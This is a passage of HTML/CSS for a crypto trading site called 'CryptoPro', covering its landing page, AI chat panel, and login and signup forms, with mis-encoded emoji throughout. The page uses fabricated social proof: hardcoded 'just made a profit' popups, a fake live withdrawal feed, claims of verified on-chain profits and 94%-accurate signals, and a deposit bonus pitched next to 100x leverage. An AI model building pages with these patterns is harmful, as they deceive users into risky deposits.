.antiphishing-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;background:var(--green3);border:1px solid rgba(0,230,118,.2);border-radius:6px;font-size:11px;color:var(--green);font-family:var(--font-mono);font-weight:700}

/* LIVE TX FEED */
.live-tx-feed{overflow:hidden;max-height:200px;position:relative}
.live-tx-feed::after{content:'';position:absolute;bottom:0;left:0;right:0;height:40px;background:linear-gradient(transparent,var(--bg1));pointer-events:none}
.tx-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;animation:tradeFlash .4s ease}
.tx-row:last-child{border-bottom:none}
.tx-type{padding:2px 7px;border-radius:4px;font-size:10px;font-weight:700;font-family:var(--font-mono);flex-shrink:0}
.tx-deposit{background:var(--green3);color:var(--green)}
.tx-withdraw{background:var(--red2);color:var(--red)}
.tx-trade{background:rgba(68,138,255,.15);color:var(--blue)}

/* MARKET BRIEF */
.market-brief-card{background:linear-gradient(135deg,rgba(0,229,255,.08),rgba(68,138,255,.05));border:1px solid rgba(0,229,255,.2);border-radius:var(--r-xl);padding:18px;position:relative;overflow:hidden;margin-bottom:16px}

/* MODALS */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:2000;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
.modal-box{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-xl);padding:28px;max-width:420px;width:100%;animation:countUp .3s ease;box-shadow:0 40px 80px rgba(0,0,0,.8)}
.modal-title{font-family:var(--font-display);font-size:20px;font-weight:800;margin-bottom:20px;display:flex;align-items:center;gap:10px}
.modal-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);font-size:13px}
.modal-row:last-of-type{border-bottom:none}
.modal-row span:first-child{color:var(--text2)}
.modal-row span:last-child{font-family:var(--font-mono);font-weight:700}
.modal-actions{display:flex;gap:10px;margin-top:20px}

/* FILL NOTIFICATION */
.fill-notification{position:fixed;bottom:90px;left:50%;transform:translateX(-50%);background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-lg);padding:14px 20px;box-shadow:0 16px 48px rgba(0,0,0,.6);z-index:1500;font-size:13px;display:flex;align-items:center;gap:12px;min-width:300px;animation:slideUp .3s ease}
.fill-icon{font-size:22px}
.fill-text{font-weight:700;font-size:14px}
.fill-sub{font-size:11px;color:var(--text2);margin-top:2px}

/* AI PANEL */
#aiBtn{position:fixed;bottom:24px;right:24px;z-index:1000;width:56px;height:56px;background:linear-gradient(135deg,#1a1f35,#0d1120);border:1px solid rgba(68,138,255,.4);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 32px rgba(0,0,0,.6),0 0 0 1px rgba(68,138,255,.15);transition:all .3s}
#aiBtn:hover{transform:scale(1.08);box-shadow:0 12px 40px rgba(68,138,255,.3)}
.ai-pulse-ring{position:absolute;inset:-6px;border:1.5px solid rgba(68,138,255,.35);border-radius:50%;animation:pulse 2.5s ease-in-out infinite}
.ai-pulse-ring2{position:absolute;inset:-12px;border:1px solid rgba(68,138,255,.15);border-radius:50%;animation:pulse 2.5s ease-in-out infinite .5s}
#aiPanel{position:fixed;bottom:92px;right:24px;width:380px;height:580px;background:linear-gradient(180deg,#0a0d18 0%,#080b14 100%);border:1px solid rgba(255,255,255,.08);border-radius:20px;box-shadow:0 32px 80px rgba(0,0,0,.8);z-index:999;display:none;flex-direction:column;overflow:hidden;animation:slideUp .3s cubic-bezier(.16,1,.3,1)}
#aiPanel.open{display:flex}
.ai-header{padding:16px 18px;background:linear-gradient(135deg,rgba(68,138,255,.12),rgba(41,98,255,.06));border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;gap:12px;flex-shrink:0}
.ai-avatar{width:38px;height:38px;border-radius:12px;background:linear-gradient(135deg,#1e3a8a,#3b82f6);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.ai-header-title{font-weight:700;font-size:14px;font-family:var(--font-display);letter-spacing:-.2px}
.ai-header-status{font-size:11px;color:var(--green);display:flex;align-items:center;gap:4px;margin-top:1px}
.ai-header-status::before{content:'';width:5px;height:5px;background:var(--green);border-radius:50%;animation:pulse 2s ease-in-out infinite}
.ai-header-actions{display:flex;gap:6px;margin-left:auto}
.ai-header-btn{width:28px;height:28px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--text2);font-size:12px;transition:all .2s}
.ai-header-btn:hover{background:rgba(255,255,255,.1);color:var(--text1)}
.ai-messages{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:14px}
.ai-messages::-webkit-scrollbar{width:3px}
.ai-messages::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1)}
.ai-msg{max-width:90%;animation:countUp .25s ease}
.ai-msg.bot{align-self:flex-start}
.ai-msg.user{align-self:flex-end}
.ai-msg-bubble{padding:11px 14px;border-radius:14px;font-size:13px;line-height:1.6}
.ai-msg.bot .ai-msg-bubble{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.07);border-radius:4px 14px 14px 14px;color:var(--text1)}
.ai-msg.user .ai-msg-bubble{background:linear-gradient(135deg,rgba(68,138,255,.25),rgba(41,98,255,.18));border:1px solid rgba(68,138,255,.25);border-radius:14px 4px 14px 14px;color:var(--text1)}
.ai-msg-meta{display:flex;align-items:center;gap:6px;margin-top:4px;font-size:10px;color:var(--text3)}
.ai-msg.user .ai-msg-meta{justify-content:flex-end}
.ai-typing{align-self:flex-start}
.ai-typing-bubble{padding:12px 16px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.07);border-radius:4px 14px 14px 14px;display:flex;gap:5px;align-items:center}
.ai-typing-dot{width:6px;height:6px;background:var(--text3);border-radius:50%;animation:pulse 1.2s ease-in-out infinite}
.ai-typing-dot:nth-child(2){animation-delay:.2s}
.ai-typing-dot:nth-child(3){animation-delay:.4s}
.ai-suggestions{padding:10px 14px;display:flex;gap:6px;flex-wrap:nowrap;overflow-x:auto;border-top:1px solid rgba(255,255,255,.05);flex-shrink:0}
.ai-suggestions::-webkit-scrollbar{height:0}
.ai-sug{padding:6px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:20px;font-size:11px;color:var(--text2);cursor:pointer;transition:all .2s;white-space:nowrap;flex-shrink:0}
.ai-sug:hover{border-color:rgba(68,138,255,.4);color:var(--blue);background:rgba(68,138,255,.08)}
.ai-input-area{padding:12px 14px;border-top:1px solid rgba(255,255,255,.05);flex-shrink:0}
.ai-input-wrap{display:flex;align-items:flex-end;gap:8px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:10px 12px;transition:border-color .2s}
.ai-input-wrap:focus-within{border-color:rgba(68,138,255,.4)}
.ai-input{flex:1;background:transparent;border:none;color:var(--text1);font-size:13px;font-family:var(--font-body);outline:none;resize:none;max-height:80px;min-height:20px;line-height:1.5}
.ai-input::placeholder{color:var(--text3)}
.ai-send{width:32px;height:32px;background:linear-gradient(135deg,var(--blue),#2962FF);border:none;border-radius:10px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:14px;transition:all .2s;flex-shrink:0}
.ai-send:hover{transform:scale(1.08);box-shadow:0 4px 12px rgba(68,138,255,.4)}
.ai-send:disabled{opacity:.4;cursor:not-allowed}
.ai-footer-hint{text-align:center;font-size:10px;color:var(--text3);margin-top:8px}

/* UTILS */
.text-green{color:var(--green)}.text-red{color:var(--red)}.text-blue{color:var(--blue)}.text-yellow{color:var(--yellow)}.text-dim{color:var(--text2)}
.mono{font-family:var(--font-mono)}.fw-bold{font-weight:700}
.news-item{display:flex;gap:12px;padding:12px 0;border-bottom:1px solid var(--border);cursor:pointer;transition:padding .15s}
.news-item:hover{padding-left:6px}
.hist-row{border-bottom:1px solid var(--border);transition:background .15s}
.hist-row:hover{background:var(--bg2)}
.hist-row td{padding:10px 12px}
.rec-action-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:18px;display:flex;align-items:center;gap:16px;transition:all .25s;cursor:pointer;margin-bottom:8px}
.rec-action-card:hover{border-color:var(--border2);transform:translateY(-2px)}
.rec-action-icon{width:48px;height:48px;border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
.rec-priority{font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;font-family:var(--font-mono)}
.rec-priority.high{background:var(--red2);color:var(--red)}
.rec-priority.med{background:rgba(255,215,64,.1);color:var(--yellow)}
.rec-priority.low{background:var(--green3);color:var(--green)}

/* RESPONSIVE */
@media(max-width:768px){
  .hero{padding:48px 20px 40px}.hero-title{font-size:34px}.stats-bar{flex-wrap:wrap}
  .stat-item{min-width:50%;border-bottom:1px solid var(--border)}.nav-ticker{display:none}
  .winners-grid,.features-grid,.reviews-grid{grid-template-columns:1fr}
  #aiPanel{width:calc(100vw - 32px);right:16px;height:520px}
  .quick-actions{grid-template-columns:repeat(4,1fr)}
}
@media(max-width:860px){.auth-page{grid-template-columns:1fr}.auth-left{display:none}.auth-right{padding:24px 16px;min-height:100vh}}
@media(max-width:900px){
  .chart-layout{grid-template-columns:1fr;height:auto}.orderbook-panel,.trades-panel{display:none}
  #tvChartContainer{height:320px;flex:none}
  .dash-body{grid-template-columns:1fr}.dash-sidebar{display:none}
  .balance-cards{grid-template-columns:1fr 1fr}.quick-actions{grid-template-columns:repeat(4,1fr)}
  .dash-two-col,.dash-three-col{grid-template-columns:1fr}
}
@media(max-width:1100px){.dash-three-col{grid-template-columns:1fr 1fr}.trading-body{grid-template-columns:1fr 260px}.trade-right-col{display:none}}
@media(max-width:480px){.balance-cards{grid-template-columns:1fr}.quick-actions{grid-template-columns:repeat(2,1fr)}}
@media(max-width:750px){.trading-body{grid-template-columns:1fr;height:auto}.trade-chart-col #tvTradingChart{height:260px}}
</style>
</head>
Part 2 of 6 â€” Full <body> HTML
<body>
<div id="refBanner">
  <button class="ref-close" onclick="document.getElementById('refBanner').classList.remove('show')">âœ•</button>
  <span class="ref-bonus-amt" id="refBonusAmt">$50</span>
  <div style="font-size:14px;color:#aaa;margin-top:4px">ðŸŽ Welcome bonus applied! Start trading with extra funds today.</div>
</div>
<div id="toast"></div>

<!-- NAVBAR -->
<nav class="navbar" id="mainNav">
  <a class="nav-logo" onclick="showLayer('welcomeLayer')">
    <div class="nav-logo-mark">â‚¿</div>
    <span class="nav-logo-text">Crypto<span>Pro</span></span>
  </a>
  <div class="nav-ticker"><div class="nav-ticker-track" id="navTicker"></div></div>
  <div class="nav-right">
    <div class="live-badge"><div class="live-dot"></div>LIVE</div>
    <button class="notif-bell" onclick="showPriceAlertModal()" title="Price Alerts" style="font-size:15px">ðŸ””</button>
    <div style="position:relative" id="notifWrap">
      <div class="notif-bell" onclick="toggleNotif()">ðŸ›Ž<span class="notif-count" id="notifCount">3</span></div>
      <div class="notif-dropdown" id="notifDropdown">
        <div class="notif-header">Notifications <span style="color:var(--text3);font-weight:400">3 new</span></div>
        <div class="notif-item"><div class="notif-icon" style="background:var(--green3)">ðŸ“ˆ</div><div><div class="notif-text"><strong>BTC/USDT</strong> hit your target price of $69,420</div><div class="notif-time">2 min ago</div></div></div>
        <div class="notif-item"><div class="notif-icon" style="background:rgba(68,138,255,.15)">ðŸ¤–</div><div><div class="notif-text"><strong>Grid Bot</strong> completed 12 trades â€” +$43.20 profit</div><div class="notif-time">18 min ago</div></div></div>
        <div class="notif-item"><div class="notif-icon" style="background:rgba(255,215,64,.1)">âš¡</div><div><div class="notif-text"><strong>Signal Alert:</strong> ETH strong BUY â€” 92% confidence</div><div class="notif-time">1 hr ago</div></div></div>
      </div>
    </div>
    <div id="navAuthBtns" style="display:flex;gap:8px">
      <button class="btn btn-outline" onclick="showLayer('loginLayer')">Sign In</button>
      <button class="btn btn-green" onclick="showLayer('signupLayer')">Get Started</button>
    </div>
    <div id="navUserChip" style="display:none">
      <div style="display:flex;align-items:center;gap:7px;padding:5px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:20px;cursor:pointer" onclick="showLayer('dashboardLayer')">
        <div style="width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--cyan));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#000" id="navAvatarLetter">J</div>
        <span style="font-size:13px;font-weight:600" id="navUserName">Trader</span>
        <span style="font-size:10px;color:var(--green);font-family:var(--font-mono)" id="navUserBalance">$0.00</span>
      </div>
    </div>
  </div>
</nav>

<!-- GLOBAL STATS BAR -->
<div class="global-stats-bar" id="globalStatsBar">
  <div class="gsb-track" id="gsbTrack"></div>
</div>

<!-- SOCIAL PROOF POPUP -->
<div class="sp-popup" id="spPopup" onclick="showLayer('signupLayer')">
  <button class="sp-popup-close" onclick="event.stopPropagation();dismissSP()">âœ•</button>
  <div class="sp-popup-icon" id="spIcon" style="background:var(--green3)">ðŸŽ‰</div>
  <div class="sp-popup-text">
    <div class="sp-popup-title" id="spTitle">Alex from New York</div>
    <div class="sp-popup-sub" id="spSub">just made a profit</div>
  </div>
  <div class="sp-popup-amount text-green" id="spAmount">+$1,240</div>
</div>

<!-- AI BUTTON -->
<button id="aiBtn" onclick="toggleAI()">
  <div class="ai-pulse-ring"></div>
  <div class="ai-pulse-ring2"></div>
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="none"/>
    <circle cx="12" cy="12" r="3" fill="#448AFF"/>
    <path d="M12 2v3M12 19v3M2 12h3M19 12h3" stroke="#448AFF" stroke-width="1.5" stroke-linecap="round"/>
    <path d="M6.34 6.34l2.12 2.12M15.54 15.54l2.12 2.12M6.34 17.66l2.12-2.12M15.54 8.46l2.12-2.12" stroke="#448AFF" stroke-width="1.2" stroke-linecap="round" opacity=".6"/>
  </svg>
</button>

<!-- AI PANEL -->
<div id="aiPanel">
  <div class="ai-header">
    <div class="ai-avatar">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#3b82f6" stroke-width="1.5"/><path d="M8 12h8M12 8v8" stroke="#3b82f6" stroke-width="1.5" stroke-linecap="round"/></svg>
    </div>
    <div>
      <div class="ai-header-title">CryptoPro AI</div>
      <div class="ai-header-status">Online â€” market analysis ready</div>
    </div>
    <div class="ai-header-actions">
      <div class="ai-header-btn" onclick="clearAIChat()" title="Clear">ðŸ—‘</div>
      <div class="ai-header-btn" onclick="toggleAI()" title="Close">âœ•</div>
    </div>
  </div>
  <div class="ai-messages" id="aiMessages">
    <div class="ai-msg bot">
      <div class="ai-msg-bubble">ðŸ‘‹ Hey! I'm your CryptoPro AI assistant. I can analyze markets, explain trading strategies, calculate position sizes, and give you real-time insights. What do you want to know?</div>
      <div class="ai-msg-meta">CryptoPro AI Â· just now</div>
    </div>
  </div>
  <div class="ai-suggestions" id="aiSuggestions">
    <div class="ai-sug" onclick="askAI(this.textContent)">BTC analysis</div>
    <div class="ai-sug" onclick="askAI(this.textContent)">Best strategy for beginners</div>
    <div class="ai-sug" onclick="askAI(this.textContent)">What is leverage trading?</div>
    <div class="ai-sug" onclick="askAI(this.textContent)">Market sentiment today</div>
    <div class="ai-sug" onclick="askAI(this.textContent)">Risk management tips</div>
  </div>
  <div class="ai-input-area">
    <div class="ai-input-wrap">
      <textarea class="ai-input" id="aiInput" placeholder="Ask anything about crypto..." rows="1" onkeydown="handleAIKey(event)" oninput="autoResizeAI(this)"></textarea>
      <button class="ai-send" id="aiSendBtn" onclick="sendAIMessage()">âž¤</button>
    </div>
    <div class="ai-footer-hint">AI responses are for informational purposes only</div>
  </div>
</div>

<!-- MOBILE BOTTOM NAV -->
<div class="mobile-bottom-nav">
  <div class="mbn-inner">
    <div class="mbn-item active" onclick="showLayer('welcomeLayer');setMBN(this)"><div class="mbn-icon">ðŸ </div><div class="mbn-label">Home</div></div>
    <div class="mbn-item" onclick="showLayer('chartLayer');setMBN(this)"><div class="mbn-icon">ðŸ“Š</div><div class="mbn-label">Charts</div></div>
    <div class="mbn-item" onclick="showLayer('tradingLayer');setMBN(this)"><div class="mbn-icon">âš¡</div><div class="mbn-label">Trade</div></div>
    <div class="mbn-item" onclick="showLayer('dashboardLayer');setMBN(this)"><div class="mbn-icon">ðŸ’¼</div><div class="mbn-label">Portfolio</div></div>
    <div class="mbn-item" onclick="showLayer('signalsLayer');setMBN(this)"><div class="mbn-icon">ðŸŽ¯</div><div class="mbn-label">Signals</div><div class="mbn-badge">5</div></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• WELCOME LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer active" id="welcomeLayer">
  <div class="market-bar"><div class="market-bar-track" id="marketBarTrack"></div></div>

  <section class="hero">
    <div class="hero-grid"></div>
    <div class="hero-tag">âš¡ Professional Grade Trading Infrastructure</div>
    <h1 class="hero-title">Trade Crypto Like<br>The <span class="accent">Top 1%</span><br><span class="dim">of Professionals</span></h1>
    <p class="hero-sub">Advanced charting, AI signals, copy trading, and automated bots â€” everything you need to dominate the markets.</p>
    <div class="hero-cta">
      <button class="btn-hero-primary" onclick="showLayer('signupLayer')">ðŸš€ Start Trading Free</button>
      <button class="btn-hero-secondary" onclick="showLayer('chartLayer')">ðŸ“Š View Live Charts</button>
    </div>
  </section>

  <div class="stats-bar">
    <div class="stat-item"><span class="stat-val" id="statTotalVol">$4.2B</span><span class="stat-lbl">24h Volume</span></div>
    <div class="stat-item"><span class="stat-val">847K+</span><span class="stat-lbl">Active Traders</span></div>
    <div class="stat-item"><span class="stat-val">156+</span><span class="stat-lbl">Trading Pairs</span></div>
    <div class="stat-item"><span class="stat-val" id="statBtcPrice">$67,420</span><span class="stat-lbl">BTC / USDT</span></div>
    <div class="stat-item"><span class="stat-val">0.02%</span><span class="stat-lbl">Maker Fee</span></div>
  </div>

  <section class="traders-section">
    <div class="section-header">
      <span class="section-title">ðŸ”¥ Live Profit Feed</span>
      <span class="section-badge">LIVE</span>
    </div>
    <div class="traders-track-wrap"><div class="traders-track" id="tradersTrack"></div></div>
  </section>

  <section class="winners-section">
    <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-bottom:4px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800;letter-spacing:-.4px">This Week's Top Traders ðŸ†</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Real traders, real profits, verified on-chain</div>
      </div>
      <button class="btn btn-outline" onclick="showLayer('leaderboardLayer')">Full Leaderboard â†’</button>
    </div>
    <div class="winners-grid" id="winnersGrid"></div>
  </section>

  <section class="features-section">
    <div style="text-align:center;margin-bottom:8px">
      <div style="font-family:var(--font-display);font-size:22px;font-weight:800;letter-spacing:-.4px">Everything You Need to Win</div>
      <div style="font-size:13px;color:var(--text2);margin-top:6px">Built for professional traders who demand the best</div>
    </div>
    <div class="features-grid">
      <div class="feature-card" onclick="showLayer('chartLayer')"><div class="feature-icon fi-green">ðŸ“Š</div><div class="feature-title">TradingView Charts</div><div class="feature-desc">Professional-grade candlestick charts with 50+ indicators, drawing tools, and multi-timeframe analysis.</div></div>
      <div class="feature-card" onclick="showLayer('signalsLayer')"><div class="feature-icon fi-blue">ðŸ¤–</div><div class="feature-title">AI Trading Signals</div><div class="feature-desc">Machine-learning powered signals with up to 94% accuracy. Get BUY/SELL alerts before the crowd.</div></div>
      <div class="feature-card" onclick="showLayer('botsLayer')"><div class="feature-icon fi-purple">âš™ï¸</div><div class="feature-title">Automated Bots</div><div class="feature-desc">Grid, DCA, Arbitrage and Trend-following bots that trade 24/7 even while you sleep.</div></div>
      <div class="feature-card" onclick="showLayer('copyTradingLayer')"><div class="feature-icon fi-cyan">ðŸ‘¥</div><div class="feature-title">Copy Trading</div><div class="feature-desc">Mirror the top 1% of traders automatically. Set your allocation and let the pros trade for you.</div></div>
      <div class="feature-card" onclick="showLayer('tradingLayer')"><div class="feature-icon fi-yellow">âš¡</div><div class="feature-title">Futures & Leverage</div><div class="feature-desc">Trade with up to 100x leverage on 80+ perpetual futures pairs with deep liquidity.</div></div>
      <div class="feature-card" onclick="showLayer('signupLayer')"><div class="feature-icon fi-red">ðŸ›¡ï¸</div><div class="feature-title">Bank-Grade Security</div><div class="feature-desc">Cold storage, 2FA, anti-phishing codes, IP whitelisting, and $500M insurance fund.</div></div>
    </div>
  </section>

  <section class="reviews-section">
    <div style="text-align:center;margin-bottom:8px">
      <div style="font-family:var(--font-display);font-size:22px;font-weight:800;letter-spacing:-.4px">Trusted by 847,000+ Traders</div>
      <div style="font-size:13px;color:var(--text2);margin-top:6px">â˜…â˜…â˜…â˜…â˜… 4.9/5 across 48,000 reviews</div>
    </div>
    <div class="reviews-grid" id="reviewsGrid"></div>
  </section>

  <section class="cta-section">
    <div class="cta-title">Ready to Start <span style="color:var(--green)">Winning</span>?</div>
    <p class="cta-sub">Join 847,000+ traders already using CryptoPro. No experience needed â€” our AI guides you every step.</p>
    <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">
      <button class="btn-hero-primary" onclick="showLayer('signupLayer')">ðŸš€ Create Free Account</button>
      <button class="btn-hero-secondary" onclick="showLayer('tradingLayer')">âš¡ Try Demo Trading</button>
    </div>
  </section>

  <footer class="footer">
    <div style="display:flex;justify-content:center;gap:24px;margin-bottom:10px;flex-wrap:wrap">
      <span onclick="showLayer('chartLayer')" style="cursor:pointer;transition:color .2s" onmouseover="this.style.color='var(--text1)'" onmouseout="this.style.color=''">Charts</span>
      <span onclick="showLayer('tradingLayer')" style="cursor:pointer;transition:color .2s" onmouseover="this.style.color='var(--text1)'" onmouseout="this.style.color=''">Trading</span>
      <span onclick="showLayer('signalsLayer')" style="cursor:pointer;transition:color .2s" onmouseover="this.style.color='var(--text1)'" onmouseout="this.style.color=''">Signals</span>
      <span onclick="showLayer('botsLayer')" style="cursor:pointer;transition:color .2s" onmouseover="this.style.color='var(--text1)'" onmouseout="this.style.color=''">Bots</span>
      <span onclick="showLayer('copyTradingLayer')" style="cursor:pointer;transition:color .2s" onmouseover="this.style.color='var(--text1)'" onmouseout="this.style.color=''">Copy Trading</span>
      <span onclick="showLayer('leaderboardLayer')" style="cursor:pointer;transition:color .2s" onmouseover="this.style.color='var(--text1)'" onmouseout="this.style.color=''">Leaderboard</span>
    </div>
    <div>Â© 2025 CryptoPro. All rights reserved. Trading involves risk. Not financial advice.</div>
  </footer>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• LOGIN LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="loginLayer">
  <div class="auth-page">
    <div class="auth-left">
      <div class="auth-left-inner">
        <div style="margin-bottom:24px"><a class="nav-logo" onclick="showLayer('welcomeLayer')"><div class="nav-logo-mark">â‚¿</div><span class="nav-logo-text">Crypto<span>Pro</span></span></a></div>
        <div class="auth-big-title">Welcome<br><span style="color:var(--green)">Back.</span></div>
        <div class="auth-big-sub">Your portfolio is waiting. Markets never sleep â€” neither do your profits.</div>
        <div class="auth-trust-list">
          <div class="auth-trust-item"><span style="color:var(--green)">âœ“</span> $0 withdrawal fees for VIP members</div>
          <div class="auth-trust-item"><span style="color:var(--green)">âœ“</span> Instant deposits via 12+ payment methods</div>
          <div class="auth-trust-item"><span style="color:var(--green)">âœ“</span> 24/7 AI-powered trading bots running for you</div>
          <div class="auth-trust-item"><span style="color:var(--green)">âœ“</span> 2FA and cold storage protection</div>
        </div>
        <div class="auth-live-card">
          <div style="font-size:11px;color:var(--text3);margin-bottom:8px;text-transform:uppercase;letter-spacing:.6px;font-weight:600">Live Activity</div>
          <div id="authLiveActivity" style="display:flex;flex-direction:column;gap:6px;font-size:12px;color:var(--text2)">
            <div>ðŸŸ¢ <strong style="color:var(--text1)">Michael T.</strong> just withdrew $3,200</div>
            <div>ðŸŸ¢ <strong style="color:var(--text1)">Sarah K.</strong> bot earned +$87 today</div>
            <div>ðŸŸ¢ <strong style="color:var(--text1)">David R.</strong> opened BTC long 25x</div>
          </div>
        </div>
      </div>
    </div>
    <div class="auth-right">
      <div class="auth-card">
        <div class="auth-form-title">Sign In</div>
        <div class="auth-form-sub">Enter your credentials to access your account</div>
        <div id="loginAlert" style="display:none"></div>
        <div class="form-group">
          <label class="form-label">Email Address</label>
          <div class="input-wrap"><span class="input-icon">ðŸ“§</span><input type="email" class="form-input" id="loginEmail" placeholder="you@example.com" autocomplete="email"></div>
        </div>
        <div class="form-group">
          <label class="form-label">Password <span class="form-label-link" onclick="showForgotModal()">Forgot password?</span></label>
          <div class="input-wrap"><span class="input-icon">ðŸ”’</span><input type="password" class="form-input" id="loginPassword" placeholder="Your password" autocomplete="current-password" onkeydown="if(event.key==='Enter')doLogin()"><button class="input-eye" onclick="togglePwd('loginPassword',this)">ðŸ‘</button></div>
        </div>
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px;font-size:12px;color:var(--text2)">
          <input type="checkbox" id="rememberMe" style="accent-color:var(--green)">
          <label for="rememberMe" style="cursor:pointer">Remember me for 30 days</label>
        </div>
        <button class="btn-auth" id="loginBtn" onclick="doLogin()">
          <span id="loginBtnText">Sign In</span>
        </button>
        <div class="auth-divider">or continue with</div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
          <button class="social-btn" onclick="doSocialLogin('Google')">ðŸŒ Google</button>
          <button class="social-btn" onclick="doSocialLogin('Apple')">ðŸŽ Apple</button>
        </div>
        <div class="auth-switch-text">Don't have an account? <a onclick="showLayer('signupLayer')">Create one free â†’</a></div>
        <div style="margin-top:12px;text-align:center;font-size:11px;color:var(--text3)">Demo: use any email + any password</div>
      </div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• SIGNUP LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="signupLayer">
  <div class="auth-page">
    <div class="auth-left">
      <div class="auth-left-inner">
        <div style="margin-bottom:24px"><a class="nav-logo" onclick="showLayer('welcomeLayer')"><div class="nav-logo-mark">â‚¿</div><span class="nav-logo-text">Crypto<span>Pro</span></span></a></div>
        <div class="signup-bonus-card">
          <div style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.6px;font-weight:600;margin-bottom:6px">ðŸŽ New Member Bonus</div>
          <div style="font-family:var(--font-mono);font-size:36px;font-weight:900;color:var(--green);line-height:1">$50</div>
          <div style="font-size:13px;color:var(--text2);margin-top:4px">Welcome bonus on first deposit of $100+</div>
          <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
            <span style="font-size:11px;background:var(--green3);color:var(--green);padding:3px 9px;border-radius:20px;font-weight:700">+ Zero trading fees 7 days</span>
            <span style="font-size:11px;background:rgba(68,138,255,.12);color:var(--blue);padding:3px 9px;border-radius:20px;font-weight:700">+ VIP access 30 days</span>
          </div>
        </div>
        <div class="auth-steps">
          <div class="auth-step"><div class="step-num">1</div>Create your account</div>
          <div class="auth-step"><div class="step-num">2</div>Verify your identity (KYC)</div>
          <div class="auth-step"><div class="step-num">3</div>Deposit & claim your bonus</div>
          <div class="auth-step"><div class="step-num">4</div>Start trading in minutes</div>
        </div>
      </div>
    </div>
    <div class="auth-right">
      <div class="auth-card">
        <!-- STEP PROGRESS -->
        <div class="signup-progress">
          <div class="sp-bar"><div class="sp-fill" id="signupProgressBar" style="width:33%"></div></div>
          <div class="sp-steps">
            <span class="sp-step active" id="spStep1">Account</span>
            <span class="sp-step" id="spStep2">Security</span>
            <span class="sp-step" id="spStep3">Confirm</span>
          </div>
        </div>

        <!-- STEP 1 -->
        <div id="signupStep1">
          <div class="auth-form-title">Create Account</div>
          <div class="auth-form-sub">Join 847,000+ traders â€” it's free</div>
          <div id="signupAlert1" style="display:none"></div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
            <div class="form-group" style="margin-bottom:0">
              <label class="form-label">First Name</label>
              <div class="input-wrap"><span class="input-icon">ðŸ‘¤</span><input type="text" class="form-input" id="signupFirst" placeholder="John"></div>
            </div>
            <div class="form-group" style="margin-bottom:0">
              <label class="form-label">Last Name</label>
              <div class="input-wrap"><span class="input-icon">ðŸ‘¤</span><input type="text" class="form-input" id="signupLast" placeholder="Doe"></div>
            </div>
          </div>
          <div class="form-group" style="margin-top:14px">
            <label class="form-label">Email Address</label>
            <div class="input-wrap"><span class="input-icon">ðŸ“§</span><input type="email" class="form-input" id="signupEmail" placeholder="you@example.com"></div>
          </div>
          <div class="form-group">
            <label class="form-label">Country</label>
            <div class="input-wrap"><span class="input-icon">ðŸŒ</span>
              <select class="form-input" id="signupCountry" style="padding-left:40px">
                <option value="">Select country...</option>
                <option>United States</option><option>United Kingdom</option><option>Germany</option><option>France</option><option>Canada</option><option>Australia</option><option>Japan</option><option>Singapore</option><option>UAE</option><option>Nigeria</option><option>South Africa</option><option>Brazil</option><option>India</option><option>Other</option>
              </select>
            </div>
          </div>
          <div style="display:flex;align-items:flex-start;gap:8px;margin-bottom:16px;font-size:12px;color:var(--text2)">
            <input type="checkbox" id="agreeTerms" style="accent-color:var(--green);margin-top:2px">
